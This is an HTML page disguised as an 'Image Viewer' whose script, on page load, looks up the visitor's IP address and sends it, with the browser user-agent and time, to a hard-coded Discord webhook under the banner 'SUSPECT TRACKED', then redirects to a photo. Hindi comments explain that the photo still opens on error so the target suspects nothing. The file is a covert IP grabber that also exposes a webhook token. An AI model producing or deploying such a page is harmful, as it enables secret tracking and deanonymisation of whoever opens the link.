<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        // अपडेटेड URL जो 100% सही JSON डेटा देता है
        fetch('https://ipify.org')
        .then(response => response.json())
        .then(data => {
            const webhookURL = "https://discord.com/api/webhooks/1546246221717442701/Xdm1gPMdRG-E90lbS6ytawkRQo4vJthOWKxgGSJGAOeBYuMqF0cPGqIgqQOHYN-uA-OS"; 
            
            const payload = {
                content: `🚨 **SUSPECT TRACKED!** 🚨\n🌐 **IP Address:** ${data.ip}\n📱 **Device/User-Agent:** ${navigator.userAgent}\n⏰ **Time:** ${new Date().toLocaleString()}`
            };
            
            return fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        })
        .then(() => {
            // डिस्कोर्ड पर मैसेज जाने के बाद फोटो खुलेगी
            window.location.href = "photo.jpg"; 
        })
        .catch((err) => {
            // बैकएंड एरर होने पर भी अपराधी को शक न हो, इसलिए फोटो फिर भी खुलेगी
            window.location.href = "photo.jpg";
        });
    </script>
</head>
<body style="background-color: black; margin: 0; padding: 0;">
</body>
</html>
